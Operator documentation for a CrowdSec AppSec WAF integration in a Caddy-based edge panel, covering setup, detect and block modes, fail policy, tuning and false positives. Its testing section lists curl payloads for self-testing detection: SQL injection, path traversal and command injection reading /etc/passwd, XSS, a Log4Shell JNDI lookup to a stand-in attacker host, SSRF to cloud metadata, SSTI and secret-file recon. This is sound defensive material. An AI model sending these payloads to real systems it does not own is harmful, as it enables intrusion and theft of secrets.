# AppSec (CrowdSec WAF-inline)

AppSec is a separate HTTP listener inside the CrowdSec container
that Caddy calls on every request to a WAF-enabled host, before the
request reaches your upstream. It runs Coraza + OWASP CRS, emits
verdicts per request, and reports WAF hits back to the panel.

This page is the operator-facing "what is it, how do I turn it on,
how do I turn it off" entry point. For rule-level detail
(exclusions, custom SecRules, paranoia levels) see [WAF](waf.md).

## Is this the same as the CrowdSec bouncer?

No. Two different components, same container.

| Layer | Runs at | Question it answers |
|---|---|---|
| **LAPI bouncer** (port `:8081`) | The front door | "Is this IP already banned?" |
| **AppSec** (ports `:7422` / `:7423`) | After the door | "Is this specific HTTP request malicious?" |

Analogy that helps most operators:

- **LAPI bouncer = the doorman with a banned-IP list.** If the
  person at the door is on the list, they do not come in. Zero
  inspection of what they are carrying.
- **AppSec = the bag check after the doorman.** The person is
  allowed in the building, now we look at the payload: the request
  path, headers, body, query string — and flag it if it matches a
  rule (SQL injection, path traversal, shell metacharacters, etc).

Both run in the same container, behind the same `crowdsec` service
name in docker-compose, but they are independent. You can have the
bouncer live and AppSec dead (or vice versa). In fact, that is the
**out-of-the-box state** of argos-edge today — see Scenario A below.

## Out-of-the-box state in v1.3.2+

- **LAPI bouncer**: working. The compose brings up CrowdSec,
  `cscli bouncers add argos-caddy-bouncer` gives you a key, the
  bouncer pulls decisions every 15 s and enforces bans.
- **AppSec**: **NOT installed by default.** The stock
  `crowdsecurity/crowdsec` image has no AppSec collections wired in.
  Ports `:7422` / `:7423` refuse connections until
  `setup-appsec.sh` runs inside the container.
- **Panel default**: `appsec.mode = detect`, `appsec.fail_open = true`.
  The panel emits the `appsec_url` in Caddy's config (detect mode),
  but the `appsec_fail_open: true` flag ensures a dead sidecar does
  not cascade into HTTP 500 responses (see v1.3.2 release notes for
  why this matters).

Net effect on a fresh install: CrowdSec IP bans work. WAF-inline
rule matching is OFF. You notice nothing in request flow. The panel
fires an [`appsec_unavailable`](notifications.md) notification on
the first probe so you know.

## The three scenarios

### A) AppSec unreachable, fail-open absorbs the failure

**State:** you haven't run `/setup-appsec.sh` (or the CrowdSec
container restarted without the collections persisted). AppSec is
dead; `:7423` refuses connections.

**Observed symptom:** none on the request path. LAPI bouncer still
bans bad IPs; requests that reach AppSec pass through silently.
The panel fires an `appsec_unavailable` warning notification the
first time the 5-minute probe detects the outage.

**What the logs say:**

```
# caddy_error.log:
"crowdsec.appsec" "appsec component unavailable"
"dial tcp ...:7423: connect: connection refused"

# panel log:
WARN msg="appsec unavailable: fired notification"
     fail_open=true error="...connection refused"
```

**Verify it's actually this scenario:**

```bash
docker exec <crowdsec-container> cscli appsec-configs list
```

An empty result (zero rows under "APPSEC-CONFIGS") means AppSec is
not set up on that CrowdSec instance.

**Action options:**

- Accept the current state. LAPI bouncer still works; you just
  don't have WAF-inline protection.
- Enable AppSec → go to Scenario B.
- Turn AppSec off entirely on the panel so the notification stops
  firing → go to Scenario C.

!!! warning "Pre-v1.3.2 behaviour"
    Before v1.3.2 the plugin defaulted to fail-**closed**. A dead
    AppSec sidecar meant every request on every host 500'd. If
    you're upgrading from ≤ v1.3.1 and see the 500 flood, upgrade
    the panel to v1.3.2+ and the symptom stops immediately — no
    other action required. Details:
    [Troubleshooting → Every request to every host returns 500 with
    `dial tcp ... :7423: connect: connection refused`](../operations/troubleshooting.md).

### B) Enable AppSec properly (WAF-inline protection on)

**One-time setup inside the CrowdSec container:**

```bash
docker exec <crowdsec-container> /setup-appsec.sh
docker compose restart crowdsec caddy
```

`setup-appsec.sh` is mounted read-only into the container at
`/setup-appsec.sh` by the shipped `docker-compose.yml`. It installs
the `appsec-virtual-patching`, `appsec-generic-rules`, and
`appsec-crs` upstream collections and copies two argos local
appsec-configs into the persistent config volume:
`argos/appsec-detect` (port 7423, `default_remediation: allow`) and,
since v1.3.12, `argos/appsec-block` (port 7422,
`default_remediation: ban`). Both reference the same rule pool
including `crowdsecurity/crs` inband, so block and detect modes
have parity coverage; the bouncer flips `appsec_url` between the
two listener ports at runtime. Subsequent container restarts load
the configs from `/etc/crowdsec/` directly — the script runs once
per fresh install.

**Verify AppSec is live:**

```bash
# From inside the caddy container (uses the argos_net DNS name):
docker exec <caddy-container> wget -qSO- -O /dev/null http://crowdsec:7423/

# Before setup: Connection refused
# After setup:  403 Forbidden (endpoint up, rejecting the empty probe)
#               or 200 OK — both are valid. NEVER connection refused.
```

On the panel side, the `appsec_unavailable` notification clears on
the next probe (5 min later, or you can restart the panel to
re-probe immediately).

**Next: pick your fail policy.**

With AppSec live, you have an informed choice between fail-open
(the default — accept brief AppSec outages at the cost of a few
unprotected requests) and fail-closed (strict — return 500 when
AppSec is unhappy). Change in **AppSec → Fail policy**. See the
[Fail policy](#fail-policy) section below.

**Next: configure per-host WAF.** AppSec running ≠ every host
protected. Enable WAF per-host in the host's **Security** tab. See
[WAF](waf.md) for rule-level tuning.

### C) Turn AppSec off entirely (bouncer only)

**When to do this:** you want IP-based bans but no WAF inspection,
for performance reasons, because your hosts aren't web-facing, or
because AppSec is not set up on your CrowdSec and you don't want
the `appsec_unavailable` notification noise.

**How:** **AppSec → Change mode → Disabled**, then confirm.

**What changes:**

- The panel stops emitting `appsec_url` / `appsec_fail_open` in
  Caddy's config on the next reconcile.
- The per-route `appsec` handler is no longer installed — zero WAF
  round-trip on the request path.
- The `appsec.fail_open` setting is ignored (no scope to apply to).
- The panel's periodic AppSec health probe stops (no URL to probe)
  — the `appsec_unavailable` notification quiets permanently.
- **LAPI bouncer remains active.** Banned IPs still get blocked at
  the edge. CrowdSec community blocklist still enforced.

Re-enable later by flipping mode back to `detect` or `block`.

## Detect mode is NOT "no-block"

The single most common operator misconception about AppSec is
that flipping mode from `block` to `detect` makes the WAF
non-blocking. It does not. Detect mode controls **the inline
verdict only**; it has nothing to say about LAPI scenarios.
A WAF hit in detect mode can still ban your IP -- the only
difference vs block mode is *where* the ban manifests.

### Mode table

| Setting | Caddy receives | Inline 403 on hit? | Scenario can ban IP? |
|---|---|---|---|
| `disabled` | (no `appsec` directive) | No -- WAF not consulted | No |
| `detect` | `default_remediation: allow` | No -- request flows to upstream | **Yes** -- see scenario cascade |
| `block` | `default_remediation: ban` | Yes -- 403 immediately | **Yes** -- in addition to inline |

The trap: an operator running `detect` after a v1.3.x dogfood
session sees their own IP banned and reaches for "but I'm in
detect mode, why am I blocked?". The answer is that "blocked"
came from a LAPI ban (next request to ANY host gets 403 from
the bouncer), not from the WAF inline verdict.

### Scenario cascade

Each step is independent and turns one signal into the next:

```
HTTP request reaches Caddy
   |
   v
Caddy's `appsec` directive sends request to AppSec listener
   |
   v
AppSec runs CRS rules. Match? -> emits an alert + (in block mode)
   |                              returns "ban" verdict for inline 403.
   v
Alert goes to LAPI's scenario engine.
   |
   v
A scenario whose filter expression matches the alert
   metadata fires. Some scenarios are threshold-based
   (5 inband alerts in 60s); some fire on a single
   alert (the now-disabled appsec-native).
   |
   v
The fired scenario produces a LAPI decision (4h IP ban
   by default). The decision is global: every host
   protected by this argos sees the ban on the next
   bouncer poll cycle (~15s).
```

In other words: `detect` only opts the request out of the
inline 403 at step 3. Steps 4-6 still run, identically to
block mode. v1.3.19 ships with the two scenarios that
auto-converted single inband alerts into bans
(`crowdsecurity/appsec-native`, `crowdsecurity/appsec-generic-test`)
removed by default, so the cascade no longer fires on a
single false-positive. Real attack patterns (multiple
matching CVE virtual-patches, or 5+ rule hits in a window)
still produce decisions.

### Per-host "true detect" -- roadmap (v1.3.20)

A future-but-not-yet-shipped knob: `hosts.true_detect_mode`,
a per-host toggle that forces the request through the
detect-mode appsec config regardless of the panel's global
mode. Hosts whose legitimate traffic chronically scores high
on CRS (legacy admin panels, bespoke API clients with weird
headers) get the toggle on; the rest of the stack stays in
block mode.

The DB schema for this column landed in **v1.3.19** but is
**dormant** -- no UI exposure, no enforcement. The original
v1.3.19 design used a panel-managed entry in CrowdSec's
`profiles.yaml` to filter on target host, but profile filters
in CrowdSec v1.6.3 compile with only `Alert` in the env and
the AppSec module never populates `Alert.Meta` with the
target host (see v1.3.19 release notes for the full
upstream-source citation). The structurally correct
approach is a per-host `appsec_config` selection through a
Caddy template, which v1.3.20 will deliver.

This is an upstream limitation, not a design choice. Until
v1.3.20 ships, the operator's escape hatch for a chronically-
false-positive host is to flip the **panel-wide** mode to
`detect` (so block-mode 403s stop) and rely on the v1.3.19
sane defaults + self-block banner to keep scenario bans rare
and recoverable.

## Tuning rationale: anomaly threshold 15 vs CRS default 5

CRS ships with `tx.inbound_anomaly_score_threshold=5`. Each
strict-rule match (e.g. content-type whitelist, header-name
charset, request-size limit) typically scores 5 -- so under
the default, *one* match means "this request is malicious".

That bar is calibrated for a public-facing SaaS where most
benign traffic is plain `GET /static/asset.css` from a
mainstream browser. It is not calibrated for a homelab where
realtime apps poll with `text/plain`, monitoring tools send
unusual `User-Agent` strings, hot-reload dev tools generate
WebSocket upgrades on every save, and admin panels fetch
JSON RPC payloads with no `Origin` header.

v1.3.19 ships with `tx.inbound_anomaly_score_threshold=15`
out of the box (see `crowdsec/appsec-rules/argos-tuning.yaml`).
The reasoning:

| Score | Means | argos verdict |
|---|---|---|
| 0-4 | Clean request or one weak signal | Not a hit |
| 5-14 | One strict rule, or two weak ones | Not a hit (CRS default would block) |
| 15-19 | Three strict rules, or one strict + a few weak | Hit |
| 20+ | Genuine attack pattern: SQLi/XSS/RCE typically rolls 20-40 | Hit |

15 is empirical -- it is the lowest threshold at which the
v1.3.x dogfood traffic (Grafana, socket.io chat, hot-reload
Vite, oncall mobile apps) stops triggering, while every
deliberately-malicious payload from `docs/features/appsec.md
> Testing AppSec detection` still trips.

Operators who want CRS-default sensitivity back can edit
`/setup/appsec-rules/argos-tuning.yaml` (or remove
`argos/tuning` from `inband_rules` in
`argos-appsec-block.yaml` / `argos-appsec-detect.yaml`) and
re-run `setup-appsec.sh`.

## Scenarios: homelab vs enterprise posture

The vendor `crowdsecurity/appsec-default` scenario set is
calibrated for a posture where every WAF hit is a ban. argos
v1.3.19 ships a homelab-friendly subset by default:

| Scenario | Argos default | Triggers on | Why |
|---|---|---|---|
| `crowdsecurity/appsec-vpatch` | **enabled** | CVE-specific vpatch rule match | Real attacks, narrow signature, low FP rate |
| `crowdsec-appsec-outofband` | **enabled** | 5+ rule hits in window | Threshold-based; single false-positive cannot trigger |
| `crowdsecurity/appsec-native` | **disabled** (v1.3.19) | Any inband WAF alert | One false-positive -> 4h ban; too aggressive for homelab traffic |
| `crowdsecurity/appsec-generic-test` | **disabled** (v1.3.19) | `/crowdsec-test-...` probe paths | Test scenario, not for production |

Operators running an enterprise-grade exposed surface (public
SaaS, customer-facing API) typically want the vendor-default
posture. Re-install the disabled scenarios with:

```bash
docker compose exec crowdsec cscli scenarios install crowdsecurity/appsec-native
docker compose exec crowdsec cscli scenarios install crowdsecurity/appsec-generic-test
```

Re-running `setup-appsec.sh` is a no-op for already-installed
scenarios; the disable step in the script `cscli scenarios
remove --force`s but a manual re-install survives that.

## Common false positives

Patterns that legitimately appear in homelab traffic and
score high under CRS defaults. Each entry lists the rule
ID, the symptom, and the v1.3.19 default response.

| Rule | Pattern | Why it false-positives | v1.3.19 default |
|---|---|---|---|
| **920420** | Request `Content-Type` not in policy whitelist | `text/plain` is excluded by default; socket.io polling and several monitoring tools use it | **Disabled** in inband (`RemoveInBandRuleByID(920420)` in both appsec configs) |
| 932100 | Unix command injection -- shell metacharacters in args | Legacy admin panels with shell-style query params, search forms with `;` | Stays enabled. Threshold 15 means single match alone does not ban; if a host needs it disabled, see `docs/features/waf.md > Per-host disable` |
| 942100 | SQL injection generic detection | ORM-generated query strings with `OR 1=1`-shaped logic, search forms with raw SQL terms | Stays enabled. Same threshold-15 absorption |
| 941100 | XSS: HTML attribute injection | Markdown editors with `<script>` test payloads, content-management tooling | Stays enabled. Same threshold-15 absorption |

If a host chronically trips on a non-disabled rule, the
preferred path is per-host rule disable via
[WAF -> Per-host enable](waf.md#per-host-enable), not a
panel-wide threshold bump.

## Fail policy

Controls what Caddy does when the AppSec sidecar returns an error
or is unreachable. Introduced in v1.3.2 as a bool setting
(`appsec.fail_open`); the UI under **AppSec → Fail policy** renders
it as a two-radio chooser.

| Setting value | Caddy config | On AppSec error |
|---|---|---|
| `true` (default) | `appsec_fail_open: true` | Request continues to upstream. WAF bypassed for that request only. Panel fires `appsec_unavailable` on first such event. |
| `false` (strict) | `appsec_fail_open: false` | Request returns HTTP 500. No fallback. |

**Default recommendation: fail-open.** Reasons:

- The CrowdSec image's AppSec is opt-in. An operator who has not
  yet run `setup-appsec.sh` on a fresh install would otherwise have
  every request 500'd — that was the v1.3.1 regression.
- A crashlooping CrowdSec container should not take your whole panel
  offline.
- The notification tells you when AppSec goes silent, so the bypass
  is observable, not secret.

**Pick fail-closed only when** you have a CrowdSec that has been
running AppSec cleanly for a long time AND you would rather have a
visible 500 than an invisible unprotected request. Homelab stacks
almost never need this; enterprise-grade setups sometimes do.

The setting is panel-wide (not per-host). Per-host opt-in /
opt-out of WAF inspection itself is a separate toggle; see
[WAF → Per-host enable](waf.md#per-host-enable).

## Panel metrics vs endpoint reachability

The **AppSec** tab surfaces two independent things, and they use
two **different** CrowdSec credential types.

| Tab area | What it reads | Credential needed |
|---|---|---|
| Status card + collections list | Local filesystem (the CrowdSec hub index mounted into the panel container) + a TCP probe to `:7422`/`:7423` | None. Works with zero CrowdSec credentials. |
| Metrics (hits chart, top IPs, top rules) | `GET /v1/alerts` on LAPI | **Machine credentials** (user + password → JWT). Bouncer key alone returns `ErrNotConfigured`. |

Pre-v1.3.4, a missing machine credential failed the whole AppSec
page with **"Could not load AppSec state: metrics from lapi:
crowdsec not configured"**. The message sounded catastrophic but
was strictly a metrics problem — AppSec request-time enforcement
was always fine because that runs via Caddy's bouncer plugin using
the *bouncer* key.

v1.3.4 scoped the failure: the metrics endpoint returns HTTP 200
with a `degraded: {code, message}` payload when machine credentials
are missing; the UI renders a yellow banner where the charts would
go, and the status card above stays functional. No manual action
required to keep the panel working.

### Automatic bootstrap (v1.3.5+)

Fresh installs get machine credentials generated **automatically on
first boot** by a short-lived `crowdsec-init` sidecar in
`docker-compose.yml`. Sequence:

1. On `docker compose up`, CrowdSec starts and becomes healthy.
2. `crowdsec-init` runs `cscli machines add argos-panel --auto -f
   /shared/crowdsec-machine-credentials.yaml` inside CrowdSec's
   network namespace, then exits 0.
3. The panel starts, reads the file via the shared `argos_shared_setup`
   volume, encrypts the password under `ARGOS_MASTER_KEY`, writes
   user + ciphertext into the `crowdsec.machine_user` +
   `crowdsec.machine_password_encrypted` settings, and deletes the
   plaintext file.
4. Subsequent boots detect the settings already populated and
   skip — `crowdsec-init` also exits early if it finds the file
   still sitting around or a prior bootstrap succeeded.

Net effect: metrics charts render on first boot, no manual step.
The credentials never appear in `.env` and the plaintext yaml
lives on the shared volume for milliseconds only.

!!! info "Regenerating the credentials"
    `docker compose up crowdsec-init` will NOT regenerate if the
    settings are populated (idempotent by design, to avoid
    accidental invalidation of a working setup). To force a
    regeneration:

    1. Delete the machine row on the LAPI side:
       `docker exec argos-crowdsec cscli machines delete argos-panel`
    2. Clear the panel settings:
       `PUT /api/settings/crowdsec.machine_user` with value `""`,
       plus the matching clear on
       `crowdsec.machine_password_encrypted`.
    3. `docker compose up crowdsec-init` — fresh creds flow through
       the same pipeline.

### Pre-v1.3.5 manual setup (still honoured)

Operators who configured machine credentials manually before v1.3.5
(via `cscli machines add` + pasting into a hypothetical settings UI
that never shipped, or via env vars) keep working: the bootstrap is
skipped when the panel sees either legacy-plaintext or v1.3.5-
encrypted credentials already stored. The env-var overrides
(`CROWDSEC_PANEL_MACHINE_USER`, `CROWDSEC_PANEL_MACHINE_PASSWORD`)
also take precedence over either storage.

## Testing AppSec detection

After enabling AppSec (mode `detect` or `block`), confirm rules
are firing on real traffic. CrowdSec ships ~190 inband + outofband
rules covering generic exploits and a vpatch list of recent CVEs.
The signatures below are deliberately benign (no actual exploit
attempts; they just match rule patterns) but reliably trigger
alerts when AppSec is wired correctly.

Run each from outside the box (a phone on cellular, a laptop on
another network) so the source IP is not in your loopback /
RFC1918 allowlist; or use a remote host you control. Substitute
`<host>` with an argos-fronted domain (e.g. `archive.example.com`).

### 1. Missing User-Agent (always-on baseline)

```bash
curl -sk -H 'User-Agent: ' "https://<host>/"
```

Triggers `crowdsecurity/experimental-no-user-agent`. The simplest
proof-of-life: any HTTP client that suppresses User-Agent.

### 2. SQLi via classic UNION-SELECT in query string

```bash
curl -sk "https://<host>/?id=1%27%20UNION%20SELECT%20NULL%2CNULL--"
```

May match a generic SQLi pattern or a CVE vpatch depending on the
target path.

### 3. Scanner User-Agent (sqlmap)

```bash
curl -sk -A 'sqlmap/1.0 (https://sqlmap.org)' "https://<host>/"
```

Common scanners ship a distinctive UA; rules in the
`crowdsecurity/generic-*` set match against an opinionated list.

### 4. Path traversal

```bash
curl -sk "https://<host>/?path=../../../../etc/passwd"
curl -sk "https://<host>/static/..%2f..%2f..%2fetc%2fpasswd"
```

Triggers traversal rules in the generic-rules collection.

### 5. Command injection

```bash
curl -sk "https://<host>/?cmd=%24%28cat%20/etc/passwd%29"
curl -sk "https://<host>/?q=;%20id"
```

### 6. XSS in query

```bash
curl -sk "https://<host>/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
```

### 7. Log4Shell-style JNDI lookup

```bash
curl -sk -H 'X-Api-Version: ${jndi:ldap://attacker.test/x}' "https://<host>/"
```

Triggers the vpatch for CVE-2021-44228.

### 8. SSRF probing internal endpoints

```bash
curl -sk "https://<host>/?url=http://169.254.169.254/latest/meta-data/"
curl -sk "https://<host>/?fetch=http://localhost:6379/"
```

### 9. Server-Side Template Injection (SSTI)

```bash
curl -sk "https://<host>/?name=%7B%7B7%2A7%7D%7D"
curl -sk "https://<host>/?template=%24%7B7%2A7%7D"
```

Triggers `crowdsecurity/generic-freemarker-ssti` and similar.

### 10. WordPress / common-CMS recon

```bash
curl -sk "https://<host>/wp-config.php.bak"
curl -sk "https://<host>/.git/config"
curl -sk "https://<host>/.env"
```

### Verifying the result

After running a few payloads, wait ~5 seconds (AppSec processes
asynchronously) then check both surfaces:

```bash
# 1. CrowdSec alert log -- one alert per (source IP x bucket)
docker exec argos-prod-crowdsec cscli alerts list --since 5m

# 2. Panel metrics -- aggregated view that drives the AppSec page
curl -s -b /tmp/argos-cookie.txt http://<panel-ip>:9180/api/appsec/metrics \
  | python3 -m json.tool
```

`total_hits` in the panel metrics should match the rough count of
matched payloads (some payloads may match multiple rules; some may
match no rule on your specific rule version). Empty after several
attempts -> see the
[detect-mode-emits-no-alerts troubleshooting entry](../operations/troubleshooting.md#detect-mode-emits-no-alerts-fixed-in-v139).

### Note on detect vs block

In **block** mode the bouncer returns 403 to the client AND records
the alert. In **detect** mode the request flows through to the
backend cleanly and only the alert is recorded. Both surfaces
above (cscli, panel metrics) work identically in both modes. The
difference is only what the originating client sees.

In **disabled** mode no listener is queried by the bouncer; alerts
will never appear from AppSec. CrowdSec scenarios sourced from
access logs (the LAPI bouncer feature, not AppSec) keep working.

## Notifications

- [`appsec_unavailable`](notifications.md) — Severity: Warning.
  Fires on the reachable → unreachable transition of a 5-minute
  panel probe against `appsec_url`. Does **not** fire when
  `appsec.mode = disabled` (no URL to probe) and does not fire
  repeatedly for consecutive failures — one edge, one event, then
  silence until recovery.

Create a rule under [Notifications → Rules](notifications.md) if
you want to be paged.

## Related

- [CrowdSec](crowdsec.md) — the LAPI bouncer (IP-level blocklist)
  and the machine credentials the panel uses to manage decisions.
  This runs *before* AppSec in the request path.
- [Access control](../operations/access-control.md) — recipes for
  geo-blocking and IP allowlists via CrowdSec decisions, and how
  those decisions interact with AppSec in the request pipeline.
- [WAF](waf.md) — rule exclusions, custom SecRules, paranoia levels,
  per-host opt-in, AppSec metrics dashboard.
- [Notifications](notifications.md) — the catalog of event types
  including `appsec_unavailable`.
- [Troubleshooting — AppSec](../operations/troubleshooting.md) —
  specific symptom-to-diagnosis mappings.
